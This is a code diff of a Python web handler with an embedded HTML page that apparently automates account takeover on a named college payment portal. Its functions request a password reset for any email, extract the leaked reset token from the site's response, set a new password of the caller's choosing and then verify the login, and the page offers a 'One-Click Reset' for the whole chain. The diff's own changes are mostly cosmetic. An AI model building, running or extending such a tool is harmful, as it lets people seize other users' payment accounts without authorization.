@@ -44,12 +44,13 @@ HTML = r"""<!DOCTYPE html>
       display: flex; justify-content: space-between; align-items: flex-start;
       margin-bottom: 1.25rem; gap: 1rem;
     }
+    .top-actions { display: flex; gap: .4rem; flex-shrink: 0; }
     h1 { font-size: 1.35rem; font-weight: 700; }
     .sub { color: var(--muted); font-size: .875rem; margin-top: .2rem; }
-    #themeBtn {
+    .icon-btn {
       background: var(--note-bg); border: 1px solid var(--border); color: var(--text);
-      border-radius: 10px; padding: .45rem .7rem; cursor: pointer; font-size: 1.1rem;
-      line-height: 1; flex-shrink: 0;
+      border-radius: 10px; padding: .45rem .65rem; cursor: pointer; font-size: 1rem;
+      line-height: 1;
     }
     label { display: block; font-size: .8125rem; font-weight: 500; margin: 1rem 0 .4rem; }
     input {
@@ -83,6 +84,8 @@ HTML = r"""<!DOCTYPE html>
     button.ghost:hover { color: var(--text); border-style: solid; }
     button.success-btn { background: #16a34a; margin-top: .6rem; }
     button.success-btn:hover { background: #15803d; }
+    button.link-btn { background: #0f766e; margin-top: .6rem; }
+    button.link-btn:hover { background: #0d9488; }
     #advanced { display: none; margin-top: .5rem; }
     #advanced.open { display: block; }
     #result {
@@ -105,11 +108,7 @@ HTML = r"""<!DOCTYPE html>
     }
     .steps span.active { color: var(--primary); border-color: var(--primary); font-weight: 600; }
     .steps span.done { color: #22c55e; border-color: #22c55e; }
-
-    /* Progress bar */
-    .progress-wrap {
-      display: none; margin-top: 1rem;
-    }
+    .progress-wrap { display: none; margin-top: 1rem; }
     .progress-wrap.show { display: block; }
     .progress-label {
       font-size: .8rem; color: var(--muted); margin-bottom: .4rem;
@@ -123,54 +122,45 @@ HTML = r"""<!DOCTYPE html>
       border-radius: 99px; transition: width .35s ease;
     }
     .progress-fill.indeterminate {
-      width: 40% !important;
-      animation: slide 1.2s ease-in-out infinite;
+      width: 40% !important; animation: slide 1.2s ease-in-out infinite;
     }
     @keyframes slide {
       0% { transform: translateX(-100%); }
       100% { transform: translateX(280%); }
     }
-
-    /* Toast */
     #toasts {
       position: fixed; top: 1rem; right: 1rem; z-index: 9999;
       display: flex; flex-direction: column; gap: .5rem; max-width: min(360px, 92vw);
       pointer-events: none;
     }
     .toast {
-      pointer-events: auto;
-      background: var(--toast-bg); color: var(--toast-text);
-      padding: .85rem 1rem; border-radius: 12px;
-      font-size: .875rem; line-height: 1.4;
-      box-shadow: 0 10px 30px rgba(0,0,0,.25);
-      animation: toastIn .25s ease;
+      pointer-events: auto; background: var(--toast-bg); color: var(--toast-text);
+      padding: .85rem 1rem; border-radius: 12px; font-size: .875rem; line-height: 1.4;
+      box-shadow: 0 10px 30px rgba(0,0,0,.25); animation: toastIn .25s ease;
       border-left: 4px solid var(--primary);
     }
     .toast.ok { border-left-color: #22c55e; }
     .toast.err { border-left-color: #ef4444; }
     .toast.hide { animation: toastOut .25s ease forwards; }
-    @keyframes toastIn {
-      from { opacity: 0; transform: translateY(-8px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    @keyframes toastOut {
-      to { opacity: 0; transform: translateY(-8px); }
-    }
+    @keyframes toastIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: none; } }
+    @keyframes toastOut { to { opacity: 0; transform: translateY(-8px); } }
   </style>
 </head>
 <body>
   <div id="toasts"></div>
-
   <div class="card">
     <div class="top">
       <div>
         <h1>Password Reset</h1>
         <p class="sub">Vanraj College Payment Portal</p>
       </div>
-      <button type="button" id="themeBtn" title="Toggle dark mode">🌙</button>
+      <div class="top-actions">
+        <button type="button" class="icon-btn" id="soundBtn" title="Sound on/off">🔊</button>
+        <button type="button" class="icon-btn" id="themeBtn" title="Dark mode">🌙</button>
+      </div>
     </div>
 
-    <div class="steps" id="steps">
+    <div class="steps">
       <span id="s1">1. Email</span>
       <span id="s2">2. Token</span>
       <span id="s3">3. Done</span>
@@ -187,13 +177,12 @@ HTML = r"""<!DOCTYPE html>
         <span id="progressText">Working...</span>
         <span id="progressPct">0%</span>
       </div>
-      <div class="progress-track">
-        <div class="progress-fill" id="progressFill"></div>
-      </div>
+      <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
     </div>
 
     <button class="full" id="oneClickBtn">One-Click Reset</button>
     <button class="full success-btn" id="testLoginBtn" style="display:none">Test Login</button>
+    <button class="full link-btn" id="openLoginBtn" style="display:none">Open Login Page ↗</button>
 
     <button type="button" class="ghost" id="toggleAdv">Advanced: manual token ▾</button>
 
@@ -207,42 +196,88 @@ HTML = r"""<!DOCTYPE html>
     </div>
 
     <div id="result"></div>
-
     <div class="note">
       <b>One-Click:</b> Email + password → auto token + reset.<br>
-      Success ke baad <b>Test Login</b> se verify kar sakte ho.
+      Success ke baad <b>Test Login</b> ya <b>Open Login Page</b> use karo.<br>
+      🔊 se sound on/off.
     </div>
   </div>
 
   <script>
     const $ = id => document.getElementById(id);
+    const LOGIN_URL = 'https://payment.vaccdharampur.org/login';
     const result = $('result');
     let lastPassword = '';
+    let soundOn = localStorage.getItem('sound') !== 'off';
 
     // Theme
-    (function initTheme() {
+    (function () {
       const saved = localStorage.getItem('theme') || 'light';
       document.documentElement.setAttribute('data-theme', saved);
       $('themeBtn').textContent = saved === 'dark' ? '☀️' : '🌙';
     })();
     $('themeBtn').onclick = () => {
-      const cur = document.documentElement.getAttribute('data-theme');
-      const next = cur === 'dark' ? 'light' : 'dark';
+      const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
       document.documentElement.setAttribute('data-theme', next);
       localStorage.setItem('theme', next);
       $('themeBtn').textContent = next === 'dark' ? '☀️' : '🌙';
     };
 
-    // Toast
+    // Sound toggle
+    function updateSoundBtn() {
+      $('soundBtn').textContent = soundOn ? '🔊' : '🔇';
+    }
+    updateSoundBtn();
+    $('soundBtn').onclick = () => {
+      soundOn = !soundOn;
+      localStorage.setItem('sound', soundOn ? 'on' : 'off');
+      updateSoundBtn();
+      if (soundOn) playSound(true);
+    };
+
+    // Web Audio beeps (no external files)
+    let audioCtx = null;
+    function playSound(ok) {
+      if (!soundOn) return;
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const now = audioCtx.currentTime;
+        const gain = audioCtx.createGain();
+        gain.connect(audioCtx.destination);
+        gain.gain.setValueAtTime(0.0001, now);
+        gain.gain.exponentialRampToValueAtTime(0.15, now + 0.02);
+
+        if (ok) {
+          // two rising beeps
+          [523.25, 659.25].forEach((freq, i) => {
+            const o = audioCtx.createOscillator();
+            o.type = 'sine';
+            o.frequency.value = freq;
+            o.connect(gain);
+            const t = now + i * 0.12;
+            o.start(t);
+            o.stop(t + 0.12);
+          });
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.35);
+        } else {
+          // low buzz
+          const o = audioCtx.createOscillator();
+          o.type = 'square';
+          o.frequency.value = 180;
+          o.connect(gain);
+          o.start(now);
+          o.stop(now + 0.22);
+          gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.25);
+        }
+      } catch (e) {}
+    }
+
     function toast(msg, ok) {
       const el = document.createElement('div');
       el.className = 'toast ' + (ok ? 'ok' : 'err');
       el.textContent = msg;
       $('toasts').appendChild(el);
-      setTimeout(() => {
-        el.classList.add('hide');
-        setTimeout(() => el.remove(), 250);
-      }, 3500);
+      setTimeout(() => { el.classList.add('hide'); setTimeout(() => el.remove(), 250); }, 3500);
     }
 
     function show(msg, ok) {
@@ -250,9 +285,9 @@ HTML = r"""<!DOCTYPE html>
       result.className = ok ? 'ok' : 'err';
       result.textContent = msg;
       toast(msg.length > 80 ? msg.slice(0, 80) + '…' : msg, ok);
+      playSound(!!ok);
     }
 
-    // Progress
     function progressShow(text, pct, indeterminate) {
       const wrap = $('progressWrap');
       const fill = $('progressFill');
@@ -282,10 +317,18 @@ HTML = r"""<!DOCTYPE html>
       });
     }
 
+    function showSuccessActions() {
+      $('testLoginBtn').style.display = 'block';
+      $('openLoginBtn').style.display = 'block';
+    }
+
     $('toggleAdv').onclick = () => {
-      const adv = $('advanced');
-      const open = adv.classList.toggle('open');
+      const open = $('advanced').classList.toggle('open');
       $('toggleAdv').textContent = open ? 'Advanced: manual token ▴' : 'Advanced: manual token ▾';
+    };
+
+    $('openLoginBtn').onclick = () => {
+      window.open(LOGIN_URL, '_blank', 'noopener,noreferrer');
     };
 
     async function api(body) {
@@ -299,23 +342,19 @@ HTML = r"""<!DOCTYPE html>
           signal: controller.signal
         });
         return await res.json();
-      } finally {
-        clearTimeout(timer);
-      }
+      } finally { clearTimeout(timer); }
     }
 
     function setBusy(busy) {
-      ['oneClickBtn','findBtn','manualBtn','testLoginBtn'].forEach(id => {
-        const el = $(id);
-        if (el) el.disabled = busy;
+      ['oneClickBtn','findBtn','manualBtn','testLoginBtn','openLoginBtn'].forEach(id => {
+        const el = $(id); if (el) el.disabled = busy;
       });
     }
 
     async function findTokenOnly() {
       const email = $('email').value.trim();
       if (!email) return show('Pehle email dalo', false);
-      setBusy(true);
-      setStep(2);
+      setBusy(true); setStep(2);
       progressShow('Token dhoondh rahe hain...', 30, true);
       try {
         const data = await api({ action: 'find_token', email });
@@ -325,15 +364,11 @@ HTML = r"""<!DOCTYPE html>
           $('token').classList.add('filled');
           progressShow('Token mil gaya', 100, false);
           show('Token mil gaya. Ab password set karke reset karo.', true);
-        } else {
-          show(data.message || 'Token nahi mila', false);
-        }
+        } else show(data.message || 'Token nahi mila', false);
       } catch (e) {
         show(e.name === 'AbortError' ? 'Timeout. Dobara try karo.' : ('Error: ' + e.message), false);
       }
-      setTimeout(progressHide, 600);
-      setBusy(false);
-      $('findBtn').textContent = 'Find';
+      setTimeout(progressHide, 600); setBusy(false);
     }
 
     async function resetWithToken() {
@@ -347,29 +382,22 @@ HTML = r"""<!DOCTYPE html>
       try {
         const data = await api({ action: 'reset', email, token, password });
         progressShow(data.success ? 'Done' : 'Failed', 100, false);
-        if (data.success) {
-          setStep(3);
-          lastPassword = password;
-          $('testLoginBtn').style.display = 'block';
-        }
+        if (data.success) { setStep(3); lastPassword = password; showSuccessActions(); }
         show(data.message, !!data.success);
-      } catch (e) {
-        show('Error: ' + e.message, false);
-      }
-      setTimeout(progressHide, 600);
-      setBusy(false);
+      } catch (e) { show('Error: ' + e.message, false); }
+      setTimeout(progressHide, 600); setBusy(false);
     }
 
     async function oneClick() {
       const email = $('email').value.trim();
       const password = $('password').value.trim();
-
       if (!email || !password) return show('Email aur New Password dono dalo', false);
       if (password.length < 6) return show('Password min 6 characters', false);
 
       setBusy(true);
       result.style.display = 'none';
       $('testLoginBtn').style.display = 'none';
+      $('openLoginBtn').style.display = 'none';
 
       try {
         setStep(2);
@@ -384,15 +412,9 @@ HTML = r"""<!DOCTYPE html>
         $('token').classList.add('filled');
         progressShow('2/2 Password reset ho raha hai...', 55, false);
 
-        const done = await api({
-          action: 'reset', email, token: found.token, password
-        });
+        const done = await api({ action: 'reset', email, token: found.token, password });
         progressShow(done.success ? 'Complete!' : 'Failed', 100, false);
-        if (done.success) {
-          setStep(3);
-          lastPassword = password;
-          $('testLoginBtn').style.display = 'block';
-        }
+        if (done.success) { setStep(3); lastPassword = password; showSuccessActions(); }
         show(done.message, !!done.success);
       } catch (e) {
         show(e.name === 'AbortError' ? 'Timeout (server slow). Dobara try karo.' : ('Error: ' + e.message), false);
@@ -407,18 +429,15 @@ HTML = r"""<!DOCTYPE html>
       const email = $('email').value.trim();
       const password = $('password').value.trim() || lastPassword;
       if (!email || !password) return show('Email aur password chahiye login test ke liye', false);
-
       setBusy(true);
       progressShow('Login test ho raha hai...', 40, true);
       try {
         const data = await api({ action: 'test_login', email, password });
         progressShow(data.success ? 'Login OK' : 'Login fail', 100, false);
         show(data.message, !!data.success);
-      } catch (e) {
-        show('Error: ' + e.message, false);
-      }
-      setTimeout(progressHide, 600);
-      setBusy(false);
+        if (data.success) $('openLoginBtn').style.display = 'block';
+      } catch (e) { show('Error: ' + e.message, false); }
+      setTimeout(progressHide, 600); setBusy(false);
     }
 
     setStep(1);
@@ -427,9 +446,7 @@ HTML = r"""<!DOCTYPE html>
     $('manualBtn').onclick = resetWithToken;
     $('oneClickBtn').onclick = oneClick;
     $('testLoginBtn').onclick = testLogin;
-    document.addEventListener('keydown', e => {
-      if (e.key === 'Enter') oneClick();
-    });
+    document.addEventListener('keydown', e => { if (e.key === 'Enter') oneClick(); });
   </script>
 </body>
 </html>
@@ -439,9 +456,7 @@ HTML = r"""<!DOCTYPE html>
 def find_token(email: str):
     BASE_URL = "https://payment.vaccdharampur.org"
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    })
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
 
     r = session.get(f"{BASE_URL}/password/reset", timeout=20)
     if r.status_code != 200:
@@ -471,27 +486,18 @@ def find_token(email: str):
 
     text_lower = post.text.lower()
     if "no valid recipients" in text_lower or "swift_transport" in text_lower:
-        return {
-            "success": False,
-            "message": "SMTP error aaya lekin token extract nahi hua. Dobara try karo.",
-        }
+        return {"success": False, "message": "SMTP error aaya lekin token extract nahi hua. Dobara try karo."}
 
-    return {
-        "success": False,
-        "message": f"Token nahi mila (HTTP {post.status_code}).",
-    }
+    return {"success": False, "message": f"Token nahi mila (HTTP {post.status_code})."}
 
 
 def reset_password(email: str, token: str, password: str):
     BASE_URL = "https://payment.vaccdharampur.org"
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    })
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
 
     reset_url = f"{BASE_URL}/password/reset/{token}"
     resp = session.get(reset_url, timeout=15)
-
     if resp.status_code != 200:
         raise Exception(f"Reset page open nahi hua ({resp.status_code}). Token expire/invalid.")
 
@@ -500,45 +506,32 @@ def reset_password(email: str, token: str, password: str):
         start = resp.text.find('name="_token" value="') + len('name="_token" value="')
         end = resp.text.find('"', start)
         csrf_token = resp.text[start:end]
-
     if not csrf_token:
         raise Exception("CSRF token nahi mila.")
 
     payload = {
-        "_token": csrf_token,
-        "token": token,
-        "email": email,
-        "password": password,
-        "password_confirmation": password,
+        "_token": csrf_token, "token": token, "email": email,
+        "password": password, "password_confirmation": password,
     }
-
     post_resp = session.post(
-        f"{BASE_URL}/password/reset",
-        data=payload,
+        f"{BASE_URL}/password/reset", data=payload,
         headers={"Referer": reset_url, "Origin": BASE_URL},
-        allow_redirects=True,
-        timeout=15,
+        allow_redirects=True, timeout=15,
     )
 
     text_lower = post_resp.text.lower()
     final_url = post_resp.url.lower().rstrip("/")
-
     success = (
         "password has been reset" in text_lower
-        or final_url.endswith("/home")
-        or "/home" in final_url
-        or final_url.endswith("/login")
-        or "/login" in final_url
+        or final_url.endswith("/home") or "/home" in final_url
+        or final_url.endswith("/login") or "/login" in final_url
         or final_url.endswith("/dashboard")
     )
-
-    if "/password/reset" in final_url and (
-        "invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower
-    ):
+    if "/password/reset" in final_url and ("invalid" in text_lower or "expired" in text_lower or "can't find" in text_lower):
         success = False
 
     if success:
-        message = "Password reset successful! Ab Test Login se verify karo."
+        message = "Password reset successful! Test Login ya Open Login Page use karo."
     elif "can't find a user" in text_lower:
         message = "Is email se koi account nahi mila."
     elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
@@ -546,20 +539,13 @@ def reset_password(email: str, token: str, password: str):
     else:
         message = f"Reset fail. URL: {post_resp.url}"
 
-    return {
-        "success": success,
-        "message": message,
-        "status_code": post_resp.status_code,
-        "final_url": post_resp.url,
-    }
+    return {"success": success, "message": message, "status_code": post_resp.status_code, "final_url": post_resp.url}
 
 
 def test_login(email: str, password: str):
     BASE_URL = "https://payment.vaccdharampur.org"
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    })
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
 
     r = session.get(f"{BASE_URL}/login", timeout=15)
     if r.status_code != 200:
@@ -568,43 +554,23 @@ def test_login(email: str, password: str):
     m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
     if not m:
         return {"success": False, "message": "Login CSRF nahi mila"}
-    csrf = m.group(1)
 
     post = session.post(
         f"{BASE_URL}/login",
-        data={"_token": csrf, "email": email, "password": password},
+        data={"_token": m.group(1), "email": email, "password": password},
         headers={"Referer": f"{BASE_URL}/login", "Origin": BASE_URL},
-        allow_redirects=True,
-        timeout=15,
+        allow_redirects=True, timeout=15,
     )
 
     final_url = post.url.lower().rstrip("/")
     text_lower = post.text.lower()
-
-    success = (
-        final_url.endswith("/home")
-        or "/home" in final_url
-        or final_url.endswith("/dashboard")
-        or "/dashboard" in final_url
-    )
-
-    # Still on login page with error
-    if "/login" in final_url and (
-        "credentials" in text_lower
-        or "invalid" in text_lower
-        or "incorrect" in text_lower
-        or "these credentials do not match" in text_lower
-    ):
+    success = final_url.endswith("/home") or "/home" in final_url or final_url.endswith("/dashboard") or "/dashboard" in final_url
+    if "/login" in final_url and ("credentials" in text_lower or "invalid" in text_lower or "incorrect" in text_lower):
         success = False
-
-    if success:
-        message = "Login successful! Password sahi set hai."
-    else:
-        message = "Login fail. Password galat ho sakta hai ya account lock."
 
     return {
         "success": success,
-        "message": message,
+        "message": "Login successful! Password sahi set hai." if success else "Login fail. Password galat ho sakta hai ya account lock.",
         "final_url": post.url,
         "status_code": post.status_code,
     }
@@ -621,7 +587,6 @@ class handler(BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(content_length).decode("utf-8")
-
         try:
             data = json.loads(body)
         except Exception:
@@ -645,15 +610,9 @@ class handler(BaseHTTPRequestHandler):
 
             token = (data.get("token") or "").strip()
             password = (data.get("password") or "").strip()
-
             if not email or not token or not password:
-                return self._json(400, {
-                    "success": False,
-                    "message": "Email, Token aur Password sab required hain",
-                })
-
+                return self._json(400, {"success": False, "message": "Email, Token aur Password sab required hain"})
             return self._json(200, reset_password(email, token, password))
-
         except Exception as e:
             return self._json(500, {"success": False, "message": f"Error: {str(e)}"})
 
